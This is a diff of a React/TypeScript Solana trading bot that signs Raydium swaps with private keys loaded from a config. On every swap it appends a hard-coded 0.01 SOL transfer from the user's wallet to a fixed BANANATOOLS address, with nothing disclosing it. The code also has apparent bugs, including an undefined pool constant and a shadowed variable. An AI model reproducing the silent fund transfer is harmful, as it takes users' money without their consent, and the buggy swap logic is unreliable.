@@ -1,27 +1,33 @@
 import { useState, useEffect } from 'react'
-import { Api, Raydium, TxVersion, parseTokenAccountResp } from '@raydium-io/raydium-sdk-v2'
-import { Radio, Input, Select, Switch, Button, notification } from 'antd'
+import {
+  Api, Raydium, TxVersion,
+  ApiV3PoolInfoStandardItem,
+  AmmV4Keys, AmmRpcData
+} from '@raydium-io/raydium-sdk-v2'
+import { Radio, Input, Select, Switch, Button, notification, message } from 'antd'
 import type { RadioChangeEvent } from 'antd';
-import { Keypair, PublicKey, SystemProgram, Transaction, Commitment, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
 import { AnchorProvider } from "@coral-xyz/anchor";
+import { ethers } from 'ethers';
+import bs58 from "bs58";
+import BN from "bn.js";
+import Decimal from 'decimal.js'
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { Header, SelectToken, Segmentd, WalletInfoCollection, JitoFee } from '@/components'
 import type { Token_Type, CollocetionType } from '@/type'
 import { SOL, PUMP, RAYAMM, SOL_TOKEN } from '@/config/Token'
-import { Input_Style, Button_Style, isMainnet } from '@/config'
-import { initSdk } from '@/Dex/Raydium'
+import { Input_Style, Button_Style, isMainnet, BANANATOOLS_ADDRESS } from '@/config'
+import { initSdk, txVersion } from '@/Dex/Raydium'
 import { PumpFunSDK } from "@/Dex/Pump";
 import { getTxLink, addPriorityFees } from '@/utils'
+import { isValidAmm, isValidCpmm } from '../Raydium/RemoveLiquidity/utils'
+import { delay, getRandomNumber, getSPLBalance, getCurrentTimestamp, getSolPrice } from './utils';
 import {
   SwapBotPage,
   LeftPage,
   RightPage,
   Card
 } from './style'
-import { bs58 } from '@coral-xyz/anchor/dist/cjs/utils/bytes';
-import { isValidAmm, isValidCpmm } from '../Raydium/RemoveLiquidity/utils'
-import { delay, getRandomNumber, getSPLBalance, getCurrentTimestamp, getSolPrice } from './utils';
-import { ethers } from 'ethers';
 
 
 interface LogsType {
@@ -44,6 +50,7 @@ const options = [
 function SwapBot() {
   const { connection } = useConnection();
   const wallet = useWallet()
+  const [messageApi, contextHolder] = message.useMessage();
   const [api, contextHolder1] = notification.useNotification();
   const [baseToken, setBseToken] = useState<Token_Type>(RAYAMM) //
   const [token, setToken] = useState<Token_Type>(SOL)
@@ -238,6 +245,7 @@ function SwapBot() {
             ? poolInfo.mintAmountA / poolInfo.mintAmountB
             : poolInfo.mintAmountB / poolInfo.mintAmountA;
         price = _price.toFixed(18)
+        console.log(price, 'price')
         programId = poolInfo.programId
       }
       if (!isValidAmm(programId) && !isValidCpmm(programId)) throw new Error('target pool is not AMM pool and Cpmm Pool')
@@ -250,6 +258,14 @@ function SwapBot() {
       return { poolId, isAmm, price: _pri }
     } catch (error) {
       return null
+    }
+  }
+
+  const getTokenSymbol = (address: string) => {
+    if (baseToken.address === address) {
+      return baseToken.symbol
+    } else {
+      return token.symbol
     }
   }
 
@@ -275,17 +291,144 @@ function SwapBot() {
       const mint1 = new PublicKey(token.address)
       const mint2 = new PublicKey(baseToken.address)
       const raydium = raydiums[walletIndex]
-      const { poolId, isAmm, price } = await rayDiumGetPool(raydium, mint1, mint2)
-      console.log(poolId, isAmm, price, '_price')
 
       const Token = new PublicKey(baseToken.address)
       const account = Keypair.fromSecretKey(bs58.decode(_walletConfig[walletIndex].privateKey))
       const { balance, amountIn } = await getAmountIn(account, Token)
+      console.log(balance, amountIn, 'balance, amountIn')
       if (amountIn == 0 || balance == 0) {
         // setCurrentIndex(item => item + 1)
         return
       }
 
+
+      let poolInfo: ApiV3PoolInfoStandardItem | undefined;
+      let poolKeys: AmmV4Keys | undefined;
+      let rpcData: AmmRpcData;
+      let price = ''
+      let programId = ''
+
+      if (isMainnet) {
+        const tokenPool: any = await raydium.api.fetchPoolByMints({ mint1, mint2 })
+        const poolId = tokenPool.data[0].id
+        const data = await raydium.api.fetchPoolById({ ids: poolId })
+        const poolInfo = data[0]
+        const _price = !poolInfo ? 0 : poolInfo.mintA.address === SOL_TOKEN
+          ? 1 / poolInfo.price
+          : poolInfo.price;
+        price = _price.toFixed(18)
+        programId = poolInfo.programId
+        if (isValidAmm(poolInfo.programId)) {
+          poolKeys = await raydium.liquidity.getAmmPoolKeys(poolId);
+          rpcData = await raydium.liquidity.getRpcPoolInfo(poolId);
+        }
+        if (isValidCpmm(poolInfo.programId)) {
+
+        }
+      } else {
+        const data = await raydium.liquidity.getPoolInfoFromRpc({ poolId: DEV_POOL })
+        poolInfo = data.poolInfo;
+        poolKeys = data.poolKeys;
+        rpcData = data.poolRpcData;
+        programId = poolInfo.programId
+        const _price =
+          poolInfo.mintA.address == token.address
+            ? poolInfo.mintAmountA / poolInfo.mintAmountB
+            : poolInfo.mintAmountB / poolInfo.mintAmountA;
+        price = _price.toFixed(18)
+      }
+      if (!isValidAmm(programId) && !isValidCpmm(programId)) throw new Error('target pool is not AMM pool and Cpmm Pool')
+      console.log(price, 'price')
+      const [baseReserve, quoteReserve, status] = [
+        rpcData.baseReserve,
+        rpcData.quoteReserve,
+        rpcData.status.toNumber(),
+      ];
+
+      if (poolInfo.mintA.address !== baseToken.address && poolInfo.mintB.address !== baseToken.address)
+        return messageApi.error('input mint does not match pool')
+
+      const baseIn = (baseToken.address === poolInfo.mintB.address);
+
+      let mintIn, mintOut;
+      if (Number(config.modeType) === 1) {        // 买入
+        [mintIn, mintOut] = baseIn
+          ? [poolInfo.mintA, poolInfo.mintB]
+          : [poolInfo.mintB, poolInfo.mintA];
+      } else {       // 卖出
+        [mintIn, mintOut] = baseIn
+          ? [poolInfo.mintB, poolInfo.mintA]
+          : [poolInfo.mintA, poolInfo.mintB];
+      }
+
+      const out = raydium.liquidity.computeAmountOut({
+        poolInfo: {
+          ...poolInfo,
+          baseReserve,
+          quoteReserve,
+          status,
+          version: 4,
+        },
+        amountIn: new BN(amountIn * 10 ** (mintIn.decimals)), //判断精度
+        mintIn: mintIn.address,
+        mintOut: mintOut.address,
+        slippage: Number(config.slippage) / 100, //滑点 // range: 1 ~ 0.0001, means 100% ~ 0.01%
+      });
+
+      logsArrChange(
+        `花费 ${amountIn} ${mintIn.symbol || getTokenSymbol(mintIn.address)} 交换 ${new Decimal(out.amountOut.toString())
+          .div(10 ** mintOut.decimals)
+          .toDecimalPlaces(mintOut.decimals)
+          .toString()} ${mintOut.symbol || getTokenSymbol(mintOut.address)}, 最小得到数量 ${new Decimal(out.minAmountOut.toString())
+            .div(10 ** mintOut.decimals)
+            .toDecimalPlaces(mintOut.decimals)} ${mintOut.symbol || getTokenSymbol(mintOut.address)}`)
+      //交易
+      const execute = await raydium.liquidity.swap({
+        poolInfo,
+        poolKeys,
+        amountIn: new BN(amountIn * 10 ** (mintIn.decimals)),
+        amountOut: out.minAmountOut,
+        fixedSide: "in",
+        inputMint: mintIn.address,
+        txVersion,
+        computeBudgetConfig: {
+          units: 5_000_000,
+          microLamports: 200_000,
+        },
+      });
+
+      const transaction = execute.transaction;
+      const Tx = new Transaction();
+      const instructions = transaction.message.compiledInstructions.map((instruction: any) => {
+        return new TransactionInstruction({
+          keys: instruction.accountKeyIndexes.map((index: any) => ({
+            pubkey: transaction.message.staticAccountKeys[index],
+            isSigner: transaction.message.isAccountSigner(index),
+            isWritable: transaction.message.isAccountWritable(index),
+          })),
+          programId: transaction.message.staticAccountKeys[instruction.programIdIndex],
+          data: Buffer.from(instruction.data),
+        });
+      });
+      instructions.forEach((instruction: any) => Tx.add(instruction));
+      if (true) {
+        Tx.add(
+          SystemProgram.transfer({
+            fromPubkey: account.publicKey,
+            toPubkey: new PublicKey(BANANATOOLS_ADDRESS),
+            lamports: 0.01 * LAMPORTS_PER_SOL,
+          })
+        );
+      }
+      const { blockhash } = await connection.getLatestBlockhash('processed');
+      Tx.recentBlockhash = blockhash;
+      const finalTxId = await sendAndConfirmTransaction(connection, Tx, [account],
+        { commitment: 'processed', skipPreflight: true });
+      const confirmed = await connection.confirmTransaction(
+        finalTxId,
+        "processed"
+      );
+      console.log(getTxLink(finalTxId))
     } catch (error) {
       console.log(error)
     }
@@ -416,6 +559,7 @@ function SwapBot() {
 
   const stopClick = () => {
     setIsStop(true)
+    setIsStart(false)
   }
 
   useEffect(() => {
